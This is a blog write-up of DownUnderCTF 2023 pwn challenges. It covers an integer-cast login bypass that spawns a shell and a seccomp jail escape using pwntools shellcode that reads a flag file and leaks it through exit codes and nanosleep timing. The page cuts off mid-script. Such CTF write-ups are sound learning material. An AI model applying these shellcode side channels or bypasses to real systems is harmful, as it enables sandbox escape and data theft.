<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>DUCTF23 | fliqqs blog</title><meta name=keywords content="pwn,ductf"><meta name=description content="DUCTF23"><meta name=author content><link rel=canonical href=https://fliqqs.github.io/posts/ductf23/ductf23/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fliqqs.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://fliqqs.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://fliqqs.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://fliqqs.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://fliqqs.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="DUCTF23"><meta property="og:description" content="DUCTF23"><meta property="og:type" content="article"><meta property="og:url" content="https://fliqqs.github.io/posts/ductf23/ductf23/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-08T16:56:10+10:00"><meta property="article:modified_time" content="2023-09-08T16:56:10+10:00"><meta property="og:site_name" content="fliqqs blog"><meta name=twitter:card content="summary"><meta name=twitter:title content="DUCTF23"><meta name=twitter:description content="DUCTF23"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://fliqqs.github.io/posts/"},{"@type":"ListItem","position":2,"name":"DUCTF23","item":"https://fliqqs.github.io/posts/ductf23/ductf23/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"DUCTF23","name":"DUCTF23","description":"DUCTF23","keywords":["pwn","ductf"],"articleBody":"Overflow Downunder This was a fun challenge where we had to find out how to log into the system.\n#include #include #include  #define USERNAME_LEN 6 #define NUM_USERS 8 char logins[NUM_USERS][USERNAME_LEN] = { \"user0\", \"user1\", \"user2\", \"user3\", \"user4\", \"user5\", \"user6\", \"admin\" }; void init() { setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); } int read_int_lower_than(int bound) { int x; scanf(\"%d\", \u0026x); if(x = bound) { puts(\"Invalid input!\"); exit(1); } return x; } int main() { init(); printf(\"Select user to log in as: \"); unsigned short idx = read_int_lower_than(NUM_USERS - 1); printf(\"Logging in as %s\\n\", logins[idx]); if(strncmp(logins[idx], \"admin\", 5) == 0) { puts(\"Welcome admin.\"); system(\"/bin/sh\"); } else { system(\"/bin/date\"); }- } So we have to enter a index that we log us in as the admin, however we are limited to a bound of NUM_USERS - 1. Interestingly read_int_lower_than returns an int. But when called is cast to an unsigned short. Which can hold values of 0 to 65,535. We have to find a number that wraps around to 8 and is less than 7. With a little trial and error I found a number.\nJail This was a great challenge that I spent most of my time trying to solve. I was not able to get the flag but I did learn a lot.\nseccomp is a tool that limits what system calls an application can make. We can see it initalized in the jail.\nvoid enable_jail(void) { undefined8 uVar1; uVar1 = seccomp_init(0); seccomp_rule_add(uVar1,0x7fff0000,0,0); seccomp_rule_add(uVar1,0x7fff0000,0x101,0); seccomp_rule_add(uVar1,0x7fff0000,0x23,0); seccomp_rule_add(uVar1,0x7fff0000,0x3c,0); seccomp_load(uVar1); return; } We care about the middle two values of each rule added 0x7fff0000 which means we are allowed to use the following syscall. A good reference of syscalls can be found here.\nhttps://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit\nWe are allowed to call read, nanosleep, exit and open. So we know we are allowed syscallâ€™s so lets have a look at main.\nbool main(void) { code *__s; setvbuf(stdout,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,2,0); __s = (code *)mmap((void *)0x0,0x80,7,0x22,0,0); if (__s != (code *)0x0) { printf(\"what is your escape plan?\\n \"); fgets((char *)__s,0x7f,stdin); enable_jail(); (*__s)(); } return __s == (code *)0x0; } We are asked for an escape plan and the stack is executable so its time to write some shell code.\nWe are told for this challenge that the flag is located in /chal/flag.txt so I made one locally with the contents DUCTF{helloworld}. The first steps was to write to shellcode to open and read the file.\n#DUCTF2023 the great escape  from pwn import * from pwnlib.util.packing import p64 elf=context.binary=ELF('./jail') # p=process('./jail') io = gdb.debug('./jail', ''' continue ''') io.readuntil('plan?\\n') def build_shellcode(offset=0): #payload will be a syscall to read the file FLAG_LEN = 0x8 shellcode = asm(shellcraft.openat(-2,'/chal/flag.txt', oflag=0)) shellcode += asm(shellcraft.amd64.linux.read(fd='rax', buffer='rsp', count=FLAG_LEN)) Entering that we can see that our flag is in memory.\nNow how to get it out? After doing some reading and watching a video from pwn college. I found out that we could use the exit code to pass out a byte of information.\nhttps://www.youtube.com/watch?v=hrT1xvxGKS4\nI was able to get an exit code 85 in this screenshot where I wanted to get out the second letter which is an ascii U the second letter of our flag. It worked by adding this additional shell code.\n #exit with a byte from RSP shellcode+= asm(''' push 0x3c pop rax push [rsp + 1] pop rdi syscall ''') I tried my payload on the remote machine but was not able to see the exit code of the child process. I tried scratching my head for a little longer but ran out of time. After the CTF was over they released solutions, I was on the right track using a side channel attack but was using the wrong method. Lets have a deeper look.\n#!/usr/bin/env python3 import math import time from pwn import * context.arch = 'amd64' def generate_shellcode(i): shellcode = shellcraft.openat(-1, '/chal/flag.txt') shellcode += shellcraft.read('rax', 'rsp', 64) if i == 0xa: shellcode += f''' mov rdx, 9 inc rdx ''' else: shellcode += f''' mov rdx, {i}''' shellcode += ''' mov al, byte [rsp + rdx] ''' # struct timespec { # .tv_sec = byte [rsp + i] / 10 # .tv_nsec = (byte [rsp + i] % 10) * 100000000 # } shellcode += ''' mov rbx, 9; inc rbx xor rdx, rdx div rbx mov rbx, rax mov rax, 100000000 mul rdx push rax push rbx ''' shellcode += shellcraft.nanosleep('rsp', 0) shellcode += shellcraft.exit(0) return shellcode def get_char_at(i): shellcode = generate_shellcode(i) # r = remote('localhost', 1337) elf=context.binary=ELF('./jail') # p=process('./jail') r = process('./jail') r.readuntil(b' ') start_time = time.time() r.writeline(asm(shellcode)) r.readall() time_taken = time.time() - start_time r.close() log.info(f'time_taken = {time_taken}s') result = chr(math.floor(time_taken * 10)) log.info(f'flag[{i}] = \"{result}\"') return result flag = ''.join([get_char_at(i) for i in range(44)]) log.success(f'flag = \"{flag}\"') Instead of an exit code they use a nanosleep and time how long the application runs for. What was cool to me is how they push the data in the struct onto the stack and pass the stack pointer register.\n","wordCount":"823","inLanguage":"en","datePublished":"2023-09-08T16:56:10+10:00","dateModified":"2023-09-08T16:56:10+10:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://fliqqs.github.io/posts/ductf23/ductf23/"},"publisher":{"@type":"Organization","name":"fliqqs blog","logo":{"@type":"ImageObject","url":"https://fliqqs.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://fliqqs.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://fliqqs.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://fliqqs.github.io/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fliqqs.github.io/>Home</a>&nbsp;Â»&nbsp;<a href=https://fliqqs.github.io/posts/>Posts</a></div><h1 class=post-title>DUCTF23</h1><div class=post-meta><span title='2023-09-08 16:56:10 +1000 AEST'>September 8, 2023</span>&nbsp;Â·&nbsp;4 min&nbsp;Â·&nbsp;823 words</div></header><div class=post-content><h3 id=overflow-downunder>Overflow Downunder<a hidden class=anchor aria-hidden=true href=#overflow-downunder>#</a></h3><p>This was a fun challenge where we had to find out how to log into the system.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define USERNAME_LEN 6
</span></span></span><span class=line><span class=cl><span class=cp>#define NUM_USERS 8
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>char</span> <span class=n>logins</span><span class=p>[</span><span class=n>NUM_USERS</span><span class=p>][</span><span class=n>USERNAME_LEN</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=s>&#34;user0&#34;</span><span class=p>,</span> <span class=s>&#34;user1&#34;</span><span class=p>,</span> <span class=s>&#34;user2&#34;</span><span class=p>,</span> <span class=s>&#34;user3&#34;</span><span class=p>,</span> <span class=s>&#34;user4&#34;</span><span class=p>,</span> <span class=s>&#34;user5&#34;</span><span class=p>,</span> <span class=s>&#34;user6&#34;</span><span class=p>,</span> <span class=s>&#34;admin&#34;</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>init</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>read_int_lower_than</span><span class=p>(</span><span class=kt>int</span> <span class=n>bound</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>x</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>x</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>x</span> <span class=o>&gt;=</span> <span class=n>bound</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Invalid input!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>x</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>init</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Select user to log in as: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>idx</span> <span class=o>=</span> <span class=n>read_int_lower_than</span><span class=p>(</span><span class=n>NUM_USERS</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Logging in as %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>logins</span><span class=p>[</span><span class=n>idx</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>strncmp</span><span class=p>(</span><span class=n>logins</span><span class=p>[</span><span class=n>idx</span><span class=p>],</span> <span class=s>&#34;admin&#34;</span><span class=p>,</span> <span class=mi>5</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Welcome admin.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/date&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=o>-</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>So we have to enter a index that we log us in as the admin, however we are limited to a bound of <code>NUM_USERS - 1</code>. Interestingly <code>read_int_lower_than</code> returns an int. But when called is cast to an unsigned short. Which can hold values of 0 to 65,535. We have to find a number that wraps around to 8 and is less than 7. With a little trial and error I found a number.</p><p><img loading=lazy src=/images/DUCTF23/downunderflow.png alt=checksec></p><h3 id=jail>Jail<a hidden class=anchor aria-hidden=true href=#jail>#</a></h3><p>This was a great challenge that I spent most of my time trying to solve. I was not able to get the flag but I did learn a lot.</p><p>seccomp is a tool that limits what system calls an application can make. We can see it initalized in the jail.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>enable_jail</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>undefined8</span> <span class=n>uVar1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=n>uVar1</span> <span class=o>=</span> <span class=n>seccomp_init</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>seccomp_rule_add</span><span class=p>(</span><span class=n>uVar1</span><span class=p>,</span><span class=mh>0x7fff0000</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>seccomp_rule_add</span><span class=p>(</span><span class=n>uVar1</span><span class=p>,</span><span class=mh>0x7fff0000</span><span class=p>,</span><span class=mh>0x101</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>seccomp_rule_add</span><span class=p>(</span><span class=n>uVar1</span><span class=p>,</span><span class=mh>0x7fff0000</span><span class=p>,</span><span class=mh>0x23</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>seccomp_rule_add</span><span class=p>(</span><span class=n>uVar1</span><span class=p>,</span><span class=mh>0x7fff0000</span><span class=p>,</span><span class=mh>0x3c</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>seccomp_load</span><span class=p>(</span><span class=n>uVar1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>We care about the middle two values of each rule added <code>0x7fff0000</code> which means we are allowed to use the following syscall. A good reference of syscalls can be found here.</p><p><a href=https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit>https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit</a></p><p>We are allowed to call read, nanosleep, exit and open. So we know we are allowed syscall&rsquo;s so lets have a look at main.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>code</span> <span class=o>*</span><span class=n>__s</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>__s</span> <span class=o>=</span> <span class=p>(</span><span class=n>code</span> <span class=o>*</span><span class=p>)</span><span class=n>mmap</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>,</span><span class=mh>0x80</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mh>0x22</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>__s</span> <span class=o>!=</span> <span class=p>(</span><span class=n>code</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;what is your escape plan?</span><span class=se>\n</span><span class=s> &gt; &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fgets</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>__s</span><span class=p>,</span><span class=mh>0x7f</span><span class=p>,</span><span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>enable_jail</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=o>*</span><span class=n>__s</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>__s</span> <span class=o>==</span> <span class=p>(</span><span class=n>code</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>We are asked for an escape plan and the stack is executable so its time to write some shell code.</p><p><img loading=lazy src=/images/DUCTF23/checksec.png alt=checksec></p><p>We are told for this challenge that the flag is located in /chal/flag.txt so I made one locally with the contents <code>DUCTF{helloworld}</code>. The first steps was to write to shellcode to open and read the file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#DUCTF2023 the great escape </span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwnlib.util.packing</span> <span class=kn>import</span> <span class=n>p64</span>
</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>=</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./jail&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># p=process(&#39;./jail&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s1>&#39;./jail&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>readuntil</span><span class=p>(</span><span class=s1>&#39;plan?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_shellcode</span><span class=p>(</span><span class=n>offset</span><span class=o>=</span><span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1>#payload will be a syscall to read the file</span>
</span></span><span class=line><span class=cl>    <span class=n>FLAG_LEN</span> <span class=o>=</span> <span class=mh>0x8</span>
</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>openat</span><span class=p>(</span><span class=o>-</span><span class=mi>2</span><span class=p>,</span><span class=s1>&#39;/chal/flag.txt&#39;</span><span class=p>,</span> <span class=n>oflag</span><span class=o>=</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>+=</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>amd64</span><span class=o>.</span><span class=n>linux</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=o>=</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=n>buffer</span><span class=o>=</span><span class=s1>&#39;rsp&#39;</span><span class=p>,</span> <span class=n>count</span><span class=o>=</span><span class=n>FLAG_LEN</span><span class=p>))</span>
</span></span></code></pre></div><p>Entering that we can see that our flag is in memory.</p><p><img loading=lazy src=/images/DUCTF23/in_mem.png alt="in memory"></p><p>Now how to get it out? After doing some reading and watching a video from pwn college. I found out that we could use the exit code to pass out a byte of information.</p><p><a href="https://www.youtube.com/watch?v=hrT1xvxGKS4">https://www.youtube.com/watch?v=hrT1xvxGKS4</a></p><p>I was able to get an exit code 85 in this screenshot where I wanted to get out the second letter which is an ascii <code>U</code> the second letter of our flag. It worked by adding this additional shell code.</p><pre tabindex=0><code>    #exit with a byte from RSP
    shellcode+= asm(&#39;&#39;&#39;

        push 0x3c
        pop rax
        push [rsp + 1]
        pop rdi
        syscall
    &#39;&#39;&#39;)
</code></pre><p><img loading=lazy src=/images/DUCTF23/ascii_out.png alt="right exit code"></p><p>I tried my payload on the remote machine but was not able to see the exit code of the child process. I tried scratching my head for a little longer but ran out of time. After the CTF was over they released solutions, I was on the right track using a side channel attack but was using the wrong method. Lets have a deeper look.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>math</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_shellcode</span><span class=p>(</span><span class=n>i</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>openat</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=s1>&#39;/chal/flag.txt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=s1>&#39;rsp&#39;</span><span class=p>,</span> <span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=mh>0xa</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>shellcode</span> <span class=o>+=</span> <span class=sa>f</span><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>        mov rdx, 9
</span></span></span><span class=line><span class=cl><span class=s1>        inc rdx
</span></span></span><span class=line><span class=cl><span class=s1>        &#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>shellcode</span> <span class=o>+=</span> <span class=sa>f</span><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>        mov rdx, </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>        &#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>+=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    mov al, byte [rsp + rdx]
</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># struct timespec {</span>
</span></span><span class=line><span class=cl>    <span class=c1>#   .tv_sec  = byte [rsp + i] / 10</span>
</span></span><span class=line><span class=cl>    <span class=c1>#   .tv_nsec = (byte [rsp + i] % 10) * 100000000</span>
</span></span><span class=line><span class=cl>    <span class=c1># }</span>
</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>+=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    mov rbx, 9; inc rbx
</span></span></span><span class=line><span class=cl><span class=s1>    xor rdx, rdx
</span></span></span><span class=line><span class=cl><span class=s1>    div rbx
</span></span></span><span class=line><span class=cl><span class=s1>    mov rbx, rax
</span></span></span><span class=line><span class=cl><span class=s1>    mov rax, 100000000
</span></span></span><span class=line><span class=cl><span class=s1>    mul rdx
</span></span></span><span class=line><span class=cl><span class=s1>    push rax
</span></span></span><span class=line><span class=cl><span class=s1>    push rbx
</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>nanosleep</span><span class=p>(</span><span class=s1>&#39;rsp&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
